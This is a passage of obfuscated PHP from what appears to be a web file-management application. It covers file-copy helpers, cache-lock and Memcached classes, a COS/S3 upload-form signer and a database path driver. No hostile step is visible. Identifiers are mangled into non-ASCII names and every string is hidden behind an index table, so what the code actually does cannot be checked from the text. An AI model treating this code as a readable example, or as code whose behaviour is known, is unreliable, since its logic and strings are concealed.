$B¿°ùÆÓÊ[33]); goto aÒ¹‹ì–Íñ; aÒ¹‹ì–Íñ: $C‡•„ñßäŠ[$B¿°ùÆÓÊ[77]] = _get($C‡•„ñßäŠ, $B¿°ùÆÓÊ[77], 0); $C‡•„ñßäŠ[$B¿°ùÆÓÊ[415]] = _get($C‡•„ñßäŠ, $B¿°ùÆÓÊ[415], 0); if (!isset($C‡•„ñßäŠ[$B¿°ùÆÓÊ[537]]) && $C‡•„ñßäŠ[$B¿°ùÆÓÊ[415]]) { $eÂÀÏøÁ‘Í[$B¿°ùÆÓÊ[534]][] = $C‡•„ñßäŠ[$B¿°ùÆÓÊ[415]]; } goto e—º‚ˆ­¯á; DÌå‚„“í²: } unset($C‡•„ñßäŠ); if (!empty($CÖ±”Àö÷Æ)) { $this->addAll($CÖ±”Àö÷Æ); } goto EÚ¹îôóÆ“; Eœ±‡…‰Ù: $B¿°ùÆÓÊ =& $_SERVER[»„]; $B‘”ŸíÏ“× = $this->sourceInfoCache($C—ÇèöÓ¶…); $d’Û•’Š®Ô = $F†ÀÎ¦ß×Ú->listPath($c¶»ÊõÜ‰è, !1, !0); goto aÙİìÒ…; EÚ¹îôóÆ“: $C‹‘ÕóÓ¶ = $this->_childrenList($C—ÇèöÓ¶…); $C‹‘ÕóÓ¶ = array_to_keyvalue($C‹‘ÕóÓ¶, $B¿°ùÆÓÊ[28]); foreach ($E‘­”¸…ƒ„ as $C‡•„ñßäŠ) { $aÕÓõ…³¬½ = $C‹‘ÕóÓ¶[$C‡•„ñßäŠ[$B¿°ùÆÓÊ[28]]]; $fÓí‡ £‹Æ = $aÕÓõ…³¬½[$B¿°ùÆÓÊ[365]]; $this->_copyApplyMeta($aÕÓõ…³¬½, $eÂÀÏøÁ‘Í); if ($C‡•„ñßäŠ[$B¿°ùÆÓÊ[29]] == $B¿°ùÆÓÊ[76]) { $C‡•„ñßäŠ[$B¿°ùÆÓÊ[75]] = $F†ÀÎ¦ß×Ú->getPathInner($C‡•„ñßäŠ[$B¿°ùÆÓÊ[75]]); $this->_copyChildTo($F†ÀÎ¦ß×Ú, $C‡•„ñßäŠ[$B¿°ùÆÓÊ[75]], $fÓí‡ £‹Æ, $fòóŸÙƒÄ, $eÂÀÏøÁ‘Í, $bÉ–ÓÔÛãà); } } goto fÊ˜òÈ†…Ã; fÊ˜òÈ†…Ã: } private function _addFiles($aÕªÆÆÔ‰ë, $Eƒ¯ôî¬Œ‘, $c–ÉĞ‹„¹ó) { goto b†·õéËß; F²æ ª°¸õ: return $DÆØ‚¦Å™§; goto B•êê¯ëà; c‹•Ş åÒ“: $cÌ°ä‹ÄçÂ = array($d¯ŒÓÄšÕ‘[159] => array($d¯ŒÓÄšÕ‘[7], array_keys($a–†Ÿó°ëÁ))); $d¥™Ä©˜¹† = $DÈ¬¨¡Å¬->where($cÌ°ä‹ÄçÂ)->select(); $d¥™Ä©˜¹† = $d¥™Ä©˜¹† ? $d¥™Ä©˜¹† : array(); goto E¼µˆ¬ÛÓÏ; b†·õéËß: $d¯ŒÓÄšÕ‘ =& $_SERVER[»„]; if (!$Eƒ¯ôî¬Œ‘ || count($Eƒ¯ôî¬Œ‘) == 0) { return array(); } $a–†Ÿó°ëÁ = array(); goto fÍò¾ÄÄğ‹; fÍò¾ÄÄğ‹: foreach ($Eƒ¯ôî¬Œ‘ as &$FñèˆÆÄ’Ñ) { goto d‘‰Şåó›; d‘‰Şåó›: Hook::trigger($d¯ŒÓÄšÕ‘[538], $FñèˆÆÄ’Ñ); $FñèˆÆÄ’Ñ[$d¯ŒÓÄšÕ‘[75]] = $aÕªÆÆÔ‰ë->getPathInner($FñèˆÆÄ’Ñ[$d¯ŒÓÄšÕ‘[75]]); $B×°¶£½ß = $aÕªÆÆÔ‰ë->hashSimple($FñèˆÆÄ’Ñ[$d¯ŒÓÄšÕ‘[75]]); goto fóÍ†…³ÏÈ; CœÊ†ˆ®Šƒ: $FñèˆÆÄ’Ñ[$d¯ŒÓÄšÕ‘[159]] = $EµÍˆ²…Ã; Hook::trigger($d¯ŒÓÄšÕ‘[539], $FñèˆÆÄ’Ñ); $a–†Ÿó°ëÁ[$EµÍˆ²…Ã][] =& $FñèˆÆÄ’Ñ; goto c¬©‰Ö‡™í; c¬©‰Ö‡™í: if (count($a–†Ÿó°ëÁ[$EµÍˆ²…Ã]) > 1) { $FñèˆÆÄ’Ñ[$d¯ŒÓÄšÕ‘[537]] = !0; } goto b‘¬ê½–­ñ; fóÍ†…³ÏÈ: $EµÍˆ²…Ã = $aÕªÆÆÔ‰ë->hashMd5($FñèˆÆÄ’Ñ[$d¯ŒÓÄšÕ‘[75]]); if (strlen($EµÍˆ²…Ã) > 10 && !isset($a–†Ÿó°ëÁ[$EµÍˆ²…Ã])) { $a–†Ÿó°ëÁ[$EµÍˆ²…Ã] = array(); } $FñèˆÆÄ’Ñ[$d¯ŒÓÄšÕ‘[160]] = $B×°¶£½ß; goto CœÊ†ˆ®Šƒ; b‘¬ê½–­ñ: } $cÌ°ä‹ÄçÂ = array($d¯ŒÓÄšÕ‘[159] => array($d¯ŒÓÄšÕ‘[7], array_keys($a–†Ÿó°ëÁ))); $DÈ¬¨¡Å¬ = Model($d¯ŒÓÄšÕ‘[540]); goto A¿Ó—…³ÔÌ; d®ìê–ó­: $F¼ËÂÇä‡ = array(); foreach ($Eƒ¯ôî¬Œ‘ as $aÍäÅ‰èİ¨) { if (isset($aÍäÅ‰èİ¨[$d¯ŒÓÄšÕ‘[537]]) && $aÍäÅ‰èİ¨[$d¯ŒÓÄšÕ‘[537]]) { continue; } $cª§Âã±ù = $aÕªÆÆÔ‰ë->getPathInner($aÍäÅ‰èİ¨[$d¯ŒÓÄšÕ‘[75]]); $Cİ¦Õí°Å‘ = $DÈ¬¨¡Å¬->addFileMake($cª§Âã±ù, $aÍäÅ‰èİ¨[$d¯ŒÓÄšÕ‘[77]], $aÍäÅ‰èİ¨[$d¯ŒÓÄšÕ‘[160]], $aÍäÅ‰èİ¨[$d¯ŒÓÄšÕ‘[159]], $aÍäÅ‰èİ¨[$d¯ŒÓÄšÕ‘[28]], $c–ÉĞ‹„¹ó); $F¼ËÂÇä‡[] = $Cİ¦Õí°Å‘; } $DÈ¬¨¡Å¬->addAll($F¼ËÂÇä‡); goto c‹•Ş åÒ“; A¿Ó—…³ÔÌ: $d¥™Ä©˜¹† = $DÈ¬¨¡Å¬->where($cÌ°ä‹ÄçÂ)->select(); $d¥™Ä©˜¹† = $d¥™Ä©˜¹† ? $d¥™Ä©˜¹† : array(); foreach ($d¥™Ä©˜¹† as $C¿Ã˜îàÙº) { if (!isset($a–†Ÿó°ëÁ[$C¿Ã˜îàÙº[$d¯ŒÓÄšÕ‘[159]]])) { continue; } $C½¯Åß…«÷ = $a–†Ÿó°ëÁ[$C¿Ã˜îàÙº[$d¯ŒÓÄšÕ‘[159]]]; foreach ($C½¯Åß…«÷ as &$FñèˆÆÄ’Ñ) { $FñèˆÆÄ’Ñ[$d¯ŒÓÄšÕ‘[415]] = $C¿Ã˜îàÙº[$d¯ŒÓÄšÕ‘[415]]; $FñèˆÆÄ’Ñ[$d¯ŒÓÄšÕ‘[537]] = !0; } unset($FñèˆÆÄ’Ñ); } goto d®ìê–ó­; E¼µˆ¬ÛÓÏ: foreach ($d¥™Ä©˜¹† as $C¿Ã˜îàÙº) { if (!isset($a–†Ÿó°ëÁ[$C¿Ã˜îàÙº[$d¯ŒÓÄšÕ‘[159]]])) { continue; } $E´¡‹Ùë°‚ =& $a–†Ÿó°ëÁ[$C¿Ã˜îàÙº[$d¯ŒÓÄšÕ‘[159]]]; foreach ($E´¡‹Ùë°‚ as &$FñèˆÆÄ’Ñ) { $FñèˆÆÄ’Ñ[$d¯ŒÓÄšÕ‘[415]] = $C¿Ã˜îàÙº[$d¯ŒÓÄšÕ‘[415]]; } unset($FñèˆÆÄ’Ñ); } $DÆØ‚¦Å™§ = array(); foreach ($Eƒ¯ôî¬Œ‘ as $eù‰ï”ÉŸĞ) { $DÆØ‚¦Å™§[$eù‰ï”ÉŸĞ[$d¯ŒÓÄšÕ‘[28]]] = $eù‰ï”ÉŸĞ; } goto F²æ ª°¸õ; B•êê¯ëà: } } define($_SERVER[»„][541], $_SERVER[»„][542]); goto dá¥ÜŸÄ•; fƒš¹è“³: class CacheLockMemcached { public function lock($f†êİ†íÂ, $c¦±Èƒ‹Õ = 0) { $EÄë¼ˆÌ = Cache::init(); $F§²Ğöê•Ü = microtime(!0) + $c¦±Èƒ‹Õ; while (microtime(!0) < $F§²Ğöê•Ü) { $eŠÙğ¡õÖ = $EÄë¼ˆÌ->get($f†êİ†íÂ); if (!$eŠÙğ¡õÖ || $eŠÙğ¡õÖ < microtime(!0)) { $bŞÌ»ÖØƒ½ = $EÄë¼ˆÌ->handle->add($f†êİ†íÂ, $F§²Ğöê•Ü, $c¦±Èƒ‹Õ); if ($bŞÌ»ÖØƒ½) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($aœØŞ‡¡´¦) { return Cache::init()->get($aœØŞ‡¡´¦); } public function unlock($e¢‡§³˜ƒß) { return Cache::init()->remove($e¢‡§³˜ƒß); } } class CacheLockDatabase { public function lock($eŸÚ©ƒÙŸË, $c„ŒÅá©ê = 0) { $d«‹ßëÊÍÎ = Model($_SERVER[»„][743]); $d¸•‚òºì„ = microtime(!0) + $c„ŒÅá©ê; while (microtime(!0) < $d¸•‚òºì„) { $C´ÁÌ¦Ã· = $d«‹ßëÊÍÎ->get($eŸÚ©ƒÙŸË); if (!$C´ÁÌ¦Ã· || $C´ÁÌ¦Ã· < microtime(!0)) { $D¹êéŒÔ¾˜ = $d«‹ßëÊÍÎ->set($eŸÚ©ƒÙŸË, $d¸•‚òºì„); if ($D¹êéŒÔ¾˜) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Fâ¹²‡…¡è) { return Model($_SERVER[»„][743])->get($Fâ¹²‡…¡è); } public function unlock($a§ØÊ¾¿±) { Model($_SERVER[»„][743])->remove($a§ØÊ¾¿±); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($DªÚÀƒ­ì‘, $fÍŸ¼ùßõ¡) { $E§êÂæØÊÒ =& $_SERVER[»„]; if (!class_exists($E§êÂæØÊÒ[772])) { show_json($E§êÂæØÊÒ[773], !1); } $this->cacheTime = $fÍŸ¼ùßõ¡; $this->handle = new Memcached(); if (is_array($DªÚÀƒ­ì‘[$E§êÂæØÊÒ[774]]) && count($DªÚÀƒ­ì‘[$E§êÂæØÊÒ[774]]) >= 1) { foreach ($DªÚÀƒ­ì‘[$E§êÂæØÊÒ[774]] as $Aê«›ç®²Õ) { $F¶¹„ºîÆğ = explode($E§êÂæØÊÒ[4], $Aê«›ç®²Õ); $this->handle->addServer($F¶¹„ºîÆğ[0], $F¶¹„ºîÆğ[1]); } } else { $this->handle->addServer($DªÚÀƒ­ì‘[$E§êÂæØÊÒ[165]], $DªÚÀƒ­ì‘[$E§êÂæØÊÒ[166]]); } } public function set($eøœÕÃÇÌ, $c²¬›ŸØÚÈ, $D„Î‡Ö åŒ = false) { $D„Î‡Ö åŒ = $D„Î‡Ö åŒ ? $D„Î‡Ö åŒ : $this->cacheTime; return $this->handle->set($eøœÕÃÇÌ, $c²¬›ŸØÚÈ, $D„Î‡Ö åŒ); } public function get($dÄ…œÇª´) { return $this->handle->get($dÄ…œÇª´); } public function remove($bœÊù—Ú) { return $this->handle->delete($bœÊù—Ú); } public function deleteAll() { return $this->handle->flush(); } } goto E×¯óÙ«Å­; DÊ¹£ÍˆŞ¥: define($_SERVER[»„][223], 2); define($_SERVER[»„][224], 3); define($_SERVER[»„][225], 1); goto f´™‚»çÈ; D¼‡¯ÕÛ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($DàÑÈË×) { parent::__construct($DàÑÈË×); $this->signatureVersion($_SERVER[»„][196]); } public function uploadFormData($DÃ¬ˆ¨……ë, $b•Î´òÃŞ = 3600) { goto dê Üó›ÓÄ; fÖ„Î÷‡Œ÷: $FçØ¹¡·Š = array($b³íÔØ†Åí[1083] => $A…ÀªÇê¦ğ, $b³íÔØ†Åí[1084] => array(array($b³íÔØ†Åí[1085] => $AÏ¸‡´ÎÁÃ), array($b³íÔØ†Åí[1086] => $this->bucket), array($b³íÔØ†Åí[1087], $b³íÔØ†Åí[1088], $b³íÔØ†Åí[33]), array($b³íÔØ†Åí[1089] => $aö²í«òÄÎ), array($b³íÔØ†Åí[1090] => $Aöƒ¯ÔÊî), array($b³íÔØ†Åí[1091] => $this->accessKey), array($b³íÔØ†Åí[1092] => $aøÀŒÍŠíä))); $FçØ¹¡·Š = json_encode($FçØ¹¡·Š); $e ¥ª·Ü— = hash_hmac($b³íÔØ†Åí[214], $aøÀŒÍŠíä, $this->secret); goto B¯ï¯ÀÌØÆ; FŞ‘îãÉº: $aö²í«òÄÎ = $b³íÔØ†Åí[1081]; $A…ÀªÇê¦ğ = gmdate($b³íÔØ†Åí[1082], time() + $b•Î´òÃŞ); $aøÀŒÍŠíä = (string) time() . $b³íÔØ†Åí[67] . (string) (time() + $b•Î´òÃŞ); goto fÖ„Î÷‡Œ÷; dê Üó›ÓÄ: $b³íÔØ†Åí =& $_SERVER[»„]; $AÏ¸‡´ÎÁÃ = $b³íÔØ†Åí[181]; $Aöƒ¯ÔÊî = $b³íÔØ†Åí[214]; goto FŞ‘îãÉº; EõÙí´²ñ: return $D¯¶İ×èé»; goto dÁË¤õóœ; B¯ï¯ÀÌØÆ: $eÀ¢âÂõ = sha1($FçØ¹¡·Š); $CÒÖí“Æ¯‘ = hash_hmac($b³íÔØ†Åí[214], $eÀ¢âÂõ, $e ¥ª·Ü—); $D¯¶İ×èé» = array($b³íÔØ†Åí[1085] => $AÏ¸‡´ÎÁÃ, $b³íÔØ†Åí[1089] => $aö²í«òÄÎ, $b³íÔØ†Åí[1093] => base64_encode($FçØ¹¡·Š), $b³íÔØ†Åí[1090] => $Aöƒ¯ÔÊî, $b³íÔØ†Åí[1091] => $this->accessKey, $b³íÔØ†Åí[1094] => $aøÀŒÍŠíä, $b³íÔØ†Åí[1095] => $CÒÖí“Æ¯‘, $b³íÔØ†Åí[165] => $this->getHost()); goto EõÙí´²ñ; dÁË¤õóœ: } public function fileOutLink($b„‡ËšĞ) { $a‘ãÕ¶ì„Ä =& $_SERVER[»„]; if (substr($b„‡ËšĞ, 0, 7) == $a‘ãÕ¶ì„Ä[1096]) { $b„‡ËšĞ = $a‘ãÕ¶ì„Ä[1097] . substr($b„‡ËšĞ, 7); } header($a‘ãÕ¶ì„Ä[152] . $b„‡ËšĞ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($D‚»…ªƒ¤Œ) { $this->pathParse = $D‚»…ªƒ¤Œ; $this->model = Model($_SERVER[»„][1098]); } public function getPath($fÁÏœêöÏï) { return trim($fÁÏœêöÏï, $_SERVER[»„][8]); } public function pathFather($b¢…ô¬Ïïö) { $CãîÙñîº = $this->parse($b¢…ô¬Ïïö); $CãîÙñîº = $this->infoSimple($b¢…ô¬Ïïö); return $CãîÙñîº ? $CãîÙñîº[$_SERVER[»„][457]] : !1; } public function getPathName($eÅ˜íâĞ„Œ) { $A®ó°¼‘Ÿ­ = $this->infoSimple($eÅ˜íâĞ„Œ); return $A®ó°¼‘Ÿ­ ? $A®ó°¼‘Ÿ­[$_SERVER[»„][28]] : !1; } public function getPathOuter($AÃ…ÛĞì¬•) { if (!$AÃ…ÛĞì¬•) { return $AÃ…ÛĞì¬•; } $aÖ—”¬ó½à = $this->parse($AÃ…ÛĞì¬•); return KodIO::make($aÖ—”¬ó½à[$_SERVER[»„][363]]); } public function copyFolderFromIO($AÙŒŒ¦”–‹, $cˆ™¯–³, $cŸËöé•õÛ, $eˆËãíƒ‚›, $FÖòó¬ˆİ¨) { $A¬§ä¨ëñ = $this->model->copyFolderFromIO($AÙŒŒ¦”–‹, $cˆ™¯–³, $cŸËöé•õÛ, $eˆËãíƒ‚›, $FÖòó¬ˆİ¨); return KodIO::make($A¬§ä¨ëñ); } public function isParentOf($Bá‡©È˜¬Ä, $dÑÚî’¡Ş) { return $this->model->isParentOf($Bá‡©È˜¬Ä, $dÑÚî’¡Ş); } public function mkfile($B“¢ÂÙ‚Ç, $E²‰Æ’‘Åœ = '', $Bï‡¨ğÈÑ¶ = REPEAT_RENAME) { $CÓ¯¾ïİÜ =& $_SERVER[»„]; $eã‰“ØÔË‰ = $this->parse($B“¢ÂÙ‚Ç); $B“¢ÂÙ‚Ç = $eã‰“ØÔË‰[$CÓ¯¾ïİÜ[363]]; for ($fÀÑ‹†ï°Ş = 0; $fÀÑ‹†ï°Ş < count($eã‰“ØÔË‰[$CÓ¯¾ïİÜ[1099]]); $fÀÑ‹†ï°Ş++) { $dÃÄîÈ¬´¼ = $eã‰“ØÔË‰[$CÓ¯¾ïİÜ[1099]][$fÀÑ‹†ï°Ş]; if ($fÀÑ‹†ï°Ş == count($eã‰“ØÔË‰[$CÓ¯¾ïİÜ[1099]]) - 1) { $B“¢ÂÙ‚Ç = $this->model->mkfile($B“¢ÂÙ‚Ç, $dÃÄîÈ¬´¼, $E²‰Æ’‘Åœ, $Bï‡¨ğÈÑ¶); break; } $B“¢ÂÙ‚Ç = $this->model->mkdir($B“¢ÂÙ‚Ç, $dÃÄîÈ¬´¼, REPEAT_SKIP); } return $this->getPathOuter($B“¢ÂÙ‚Ç); } public function mkdir($fŸ÷ÀÆ‰ì, $B«ö’…ÁØ³ = REPEAT_SKIP) { $A™Ì£Ÿâì¥ =& $_SERVER[»„]; $C¦‹¾àğË = $this->parse($fŸ÷ÀÆ‰ì); $fŸ÷ÀÆ‰ì = $C¦‹¾àğË[$A™Ì£Ÿâì¥[363]]; for ($EïğÕ½¬ë = 0; $EïğÕ½¬ë < count($C¦‹¾àğË[$A™Ì£Ÿâì¥[1099]]); $EïğÕ½¬ë++) { $C¸ÅÏ²ÔÛœ = $C¦‹¾àğË[$A™Ì£Ÿâì¥[1099]][$EïğÕ½¬ë]; $fŸ÷ÀÆ‰ì = $this->model->mkdir($fŸ÷ÀÆ‰ì, $C¸ÅÏ²ÔÛœ, $B«ö’…ÁØ³); } return $this->getPathOuter($fŸ÷ÀÆ‰ì); } public function copyFile($BšÄ¶¤Ğµ, $E”ëäç‰à, $BÁøáÃƒ³• = REPEAT_REPLACE) { $A•‡“‚àí =& $_SERVER[»„]; $A³—»¿æ…¡ = $this->parse($E”ëäç‰à); $b° À´ìœ = $this->model->copy($BšÄ¶¤Ğµ, $A³—»¿æ…¡[$A•‡“‚àí[363]], $BÁøáÃƒ³•, $A³—»¿æ…¡[$A•‡“‚àí[75]]); return $b° À´ìœ ? $this->getPathOuter($b° À´ìœ) : !1; } public function moveFile($aÄœ×°Òò, $AÅ¡ÈÂÁ†ñ, $cïèáŠÀÙ = REPEAT_REPLACE) { $f¾çÆğÉ‹¢ =& $_SERVER[»„]; $EÁÆÓ¤•ó = $this->parse($AÅ¡ÈÂÁ†ñ); $d“ªƒÜàö± = $this->model->move($aÄœ×°Òò, $EÁÆÓ¤•ó[$f¾çÆğÉ‹¢[363]], $cïèáŠÀÙ, $EÁÆÓ¤•ó[$f¾çÆğÉ‹¢[75]]); return $d“ªƒÜàö± ? $this->getPathOuter($d“ªƒÜàö±) : !1; } public function copy($CÄæ¨”å¡, $cÁƒ²Şµºİ, $C­Š‚ÉÌÛ = REPEAT_REPLACE) { $F¹ˆ¯ÔİŒ¦ = $this->parse($cÁƒ²Şµºİ); $C£”¢õ÷šº = $this->model->copy($CÄæ¨”å¡, $F¹ˆ¯ÔİŒ¦[$_SERVER[»„][363]], $C­Š‚ÉÌÛ); return $C£”¢õ÷šº ? $this->getPathOuter($C£”¢õ÷šº) : !1; } public function move($D¨Ñ²Ò‹Öù, $BØ‡Ã×ëé, $eçõ˜‚“ä× = REPEAT_REPLACE) { $b¨¢ğ’ªÃÂ = $this->parse($BØ‡Ã×ëé); $añ·é„™Ö„ = $this->model->move($D¨Ñ²Ò‹Öù, $b¨¢ğ’ªÃÂ[$_SERVER[»„][363]], $eçõ˜‚“ä×); return $añ·é„™Ö„ ? $this->getPathOuter($añ·é„™Ö„) : !1; } public function remove($fïéØŸ†Ÿè, $bÇ…ŠòŸíç = true) { return $this->model->remove($fïéØŸ†Ÿè, $bÇ…ŠòŸíç); } public function rename($dö×ÆÉ¨ÆÕ, $CÄĞÉ³‚) { $fÇ Õ®ÏÒÆ = $this->model->rename($dö×ÆÉ¨ÆÕ, $CÄĞÉ³‚); return $fÇ Õ®ÏÒÆ ? $this->getPathOuter($dö×ÆÉ¨ÆÕ) : $fÇ Õ®ÏÒÆ; } public function size($b×™óÚß¡¤) { $bÕ©Î½Î° = $this->infoSimple($b×™óÚß¡¤); return $bÕ©Î½Î° ? $bÕ©Î½Î°[$_SERVER[»„][77]] : 0; } public function infoSimple($Cô’ ÖÑ÷) { return $this->model->sourceInfo($Cô’ ÖÑ÷); } public function info($CÒÛá¿Èˆˆ) { return $this->infoParse($CÒÛá¿Èˆˆ); } public function infoAuth($b½çÆâ×‹ä) { return $this->infoParse($b½çÆâ×‹ä, !1, !0); } public function infoWithChildren($b¨ˆÁéŠ·) { return $this->infoParse($b¨ˆÁéŠ·, !0); } protected function infoParse($cÌ†ˆ¤Éàğ, $cîí§¸×ø = false, $D©öÙÜŸ±Ù = false) { if (!$cîí§¸×ø) { return $this->model->pathInfo($cÌ†ˆ¤Éàğ, $D©öÙÜŸ±Ù); } return $this->model->pathInfoMore($cÌ†ˆ¤Éàğ); } public function infoFull($D”¼Ñº—Ë) { $E†¤¹°Ÿêø =& $_SERVER[»„]; $f±»½Ëé™ = explode($E†¤¹°Ÿêø[8], $D”¼Ñº—Ë); $dğ›àÛ•  = implode($E†¤¹°Ÿêø[8], array_splice($f±»½Ëé™, 1)); return $this->model->pathInfoByPath($f±»½Ëé™[0], $dğ›àÛ• ); } public function hashSimple($b’ñ±ƒ¤Şğ) { $d°Œ¸¸¾– =& $_SERVER[»„]; $Fíã„ÄÕÂ  = $this->infoWithChildren($b’ñ±ƒ¤Şğ); return $Fíã„ÄÕÂ [$d°Œ¸¸¾–[158]][$d°Œ¸¸¾–[160]]; } public function hashMd5($d¿ÔÇñ’É) { $D»Æ¶ÕÅÀ„ =& $_SERVER[»„]; $cĞÜ½æµ = $this->infoWithChildren($d¿ÔÇñ’É); return $cĞÜ½æµ[$D»Æ¶ÕÅÀ„[158]][$D»Æ¶ÕÅÀ„[159]]; } public function exist($Eî…ñÃ®¶²) { $fÄõ”È¿ =& $_SERVER[»„]; $a«©èöëâÉ = $this->parse($Eî…ñÃ®¶²); if (!$a«©èöëâÉ[$fÄõ”È¿[75]]) { return $this->isFile($Eî…ñÃ®¶²) || $this->isFolder($Eî…ñÃ®¶²); } $F™…çùÌ…“ = array($fÄõ”È¿[364] => $a«©èöëâÉ[$fÄõ”È¿[363]], $fÄõ”È¿[28] => $a«©èöëâÉ[$fÄõ”È¿[75]]); $AÊÚƒ«Øğô = $this->model->where($F™…çùÌ…“)->find(); return $AÊÚƒ«Øğô ? !0 : !1; } public function isFile($e¼—éùßöÈ) { $E˜£–Ï İÈ =& $_SERVER[»„]; $F¡¼«©ƒÒ° = $this->infoSimple($e¼—éùßöÈ); return $F¡¼«©ƒÒ° && $F¡¼«©ƒÒ°[$E˜£–Ï İÈ[366]] == $E˜£–Ï İÈ[83] ? !1 : !0; } public function isFolder($cè­‹í­¿·) { $A…ñù‘”§Æ =& $_SERVER[»„]; $bÆÍí“ğƒ = $this->infoSimple($cè­‹í­¿·); return $bÆÍí“ğƒ && $bÆÍí“ğƒ[$A…ñù‘”§Æ[366]] == $A…ñù‘”§Æ[83] ? !0 : !1; } public function listPath($FœµŸìÁ³Æ, $bë’†ÏßîÖ = false) { $C”œİ–¿¿Ö =& $_SERVER[»„]; if ($FœµŸìÁ³Æ == $C”œİ–¿¿Ö[33]) { return !1; } $aŸ—Û™ÒÔ = array($C”œİ–¿¿Ö[364] => $FœµŸìÁ³Æ); if ($bë’†ÏßîÖ) { return $this->model->listSource($aŸ—Û™ÒÔ, -1); } return $this->model->listSource($aŸ—Û™ÒÔ); } public function has($FÕğ‹Õö¥, $A®„Á³‚ò = false, $b°­˜ÈŒ”İ = null) { $a›İñÁõÅ =& $_SERVER[»„]; $cÌ‡Ù»¿ = $this->infoWithChildren($FÕğ‹Õö¥); if ($A®„Á³‚ò) { return array($a›İñÁõÅ[188] => $cÌ‡Ù»¿[$a›İñÁõÅ[188]], $a›İñÁõÅ[187] => $cÌ‡Ù»¿[$a›İñÁõÅ[187]]); } return $b°­˜ÈŒ”İ ? $cÌ‡Ù»¿[$a›İñÁõÅ[188]] : $cÌ‡Ù»¿[$a›İñÁõÅ[187]]; } public function listAll($b·¿Æ¸Î ) { $dÜ¨×ïªî§ = IO::info($this->pathParse[$_SERVER[»„][75]]); if (!$dÜ¨×ïªî§) { return array(); } return $this->model->listAll($b·¿Æ¸Î ); } public function getContent($a¤İÑÜÎ‹) { return $this->model->getContent($a¤İÑÜÎ‹); } public function setContent($aÜ‹²ñÆ¦Ç, $dÛ¿ÜÀ¾Û = '') { return $this->model->setContent($aÜ‹²ñÆ¦Ç, $dÛ¿ÜÀ¾Û); } public function fileSubstr($càö´®‘Íê, $a¥š¬Ø«í, $D³‹„à¬Ì„) { return $this->model->fileSubstr($càö´®‘Íê, $a¥š¬Ø«í, $D³‹„à¬Ì„); } public function download($EŞ¸¡…šÏ, $cÃš…»‘¶Ã = '') { $FÖ¸ÁØĞàÇ = get_path_father($cÃš…»‘¶Ã); $b¨—¿Ö»ê = get_path_this($cÃš…»‘¶Ã); $dù¨œŸ½” = $this->model->fileInfoGet($EŞ¸¡…šÏ); $e¼®ğ‚Ëä§ = IO::copy($dù¨œŸ½”[$_SERVER[»„][75]], $FÖ¸ÁØĞàÇ, !1, $b¨—¿Ö»ê); return $e¼®ğ‚Ëä§; } public function upload($EĞøª¶Ü‡ø, $b˜ï¥Ó¥å†, $bß÷‰¢ì¸ = false, $D¨ÍµŠâˆ = REPEAT_REPLACE) { $DÖÕË¾¢«¼ =& $_SERVER[»„]; $b¹‘ğ›İù = $this->parse($EĞøª¶Ü‡ø); $c¡áóñ“®à = $this->model->addFile($b¹‘ğ›İù[$DÖÕË¾¢«¼[363]], $b˜ï¥Ó¥å†, $b¹‘ğ›İù[$DÖÕË¾¢«¼[75]], $bß÷‰¢ì¸, $D¨ÍµŠâˆ); return $this->getPathOuter($c¡áóñ“®à); } public function uploadFileByID($aâÈÁë‡ë«, $fÙéƒˆˆÓ¨, $EßÖÂÚ¨´Ú) { $e°¨¿ŞÇˆ­ =& $_SERVER[»„]; $eËÏä·„¦æ = $this->parse($aâÈÁë‡ë«); $Fß‚ÔßóØ = $this->model->addFileByFileID($eËÏä·„¦æ[$e°¨¿ŞÇˆ­[363]], $fÙéƒˆˆÓ¨, $eËÏä·„¦æ[$e°¨¿ŞÇˆ­[75]], $EßÖÂÚ¨´Ú); return $this->getPathOuter($Fß‚ÔßóØ); } public function addFileByRemote($BŠò•½ƒğ…, $b‹Í‘ªŒÍÛ, $d±öÈ…˜İ­ = array(), $fª¨îæİ·Ù = '', $F£ß ÒíØŒ) { $DÍ÷‚Ú©¹í =& $_SERVER[»„]; $FÁÑÔÒÚ¢Ú = $this->parse($BŠò•½ƒğ…); $fª¨îæİ·Ù = empty($fª¨îæİ·Ù) ? $FÁÑÔÒÚ¢Ú[$DÍ÷‚Ú©¹í[75]] : $fª¨îæİ·Ù; $CªÆÅÆµÖ¤ = $this->model->addFileByRemote($FÁÑÔÒÚ¢Ú[$DÍ÷‚Ú©¹í[363]], $b‹Í‘ªŒÍÛ, $fª¨îæİ·Ù, $d±öÈ…˜İ­, $F£ß ÒíØŒ); return $this->getPathOuter($CªÆÅÆµÖ¤); } public function uploadLink($cœ‰Ñ¼ã®š, $A¾ ´¯ç—à = 0) { $d²èËÃ¹œ =& $_SERVER[»„]; $cªÄÆ±¨é¬ = $this->parse($cœ‰Ñ¼ã®š); $cœ‰Ñ¼ã®š = Model($d²èËÃ¹œ[540])->createFileName($cªÄÆ±¨é¬[$d²èËÃ¹œ[75]]); $F¢ßÄ¤Ş = IO::uploadLink($cœ‰Ñ¼ã®š, $A¾ ´¯ç—à); return $F¢ßÄ¤Ş; } public function fileNameAuto($C»Æ™„‚†, $AÍÅ¼Ïø›ô, $FÁŒ¯¿øˆ„ = REPEAT_REPLACE, $cİƒó–÷ì® = false) { return $this->model->fileNameAuto($C»Æ™„‚†, $AÍÅ¼Ïø›ô, $FÁŒ¯¿øˆ„, $cİƒó–÷ì®); } public function fileNameExist($D·ø²¹Îä, $eĞĞ£Æ‰ŠÒ) { return $this->model->fileNameExist($D·ø²¹Îä, $eĞĞ£Æ‰ŠÒ); } protected function _fileOut($añÅ®«æÇ, $F¯ŞËªÅä = false, $f¸¶ÍœŠŸ = false, $dÆÕö™“òø = '', $AÚˆç¶¢ = false) { goto EœŞöšŞÑ; cÀñï«‹•: $D¯×›ñ³‡ = $this->model->fileInfoGet($añÅ®«æÇ); $dÆÕö™“òø = $D¯×›ñ³‡[$fí Çéî…›[159]] ? $D¯×›ñ³‡[$fí Çéî…›[159]] : $dÆÕö™“òø; $C³Õ²¿¶ = isset($GLOBALS[$fí Çéî…›[1101]]) ? $GLOBALS[$fí Çéî…›[1101]] : $F‹êçæİó“[$fí Çéî…›[28]]; goto aÄŠ“¹¤¬†; EœŞöšŞÑ: $fí Çéî…› =& $_SERVER[»„]; $F‹êçæİó“ = $this->model->sourceInfo($añÅ®«æÇ); if ($F‹êçæİó“[$fí Çéî…›[366]] == $fí Çéî…›[83]) { 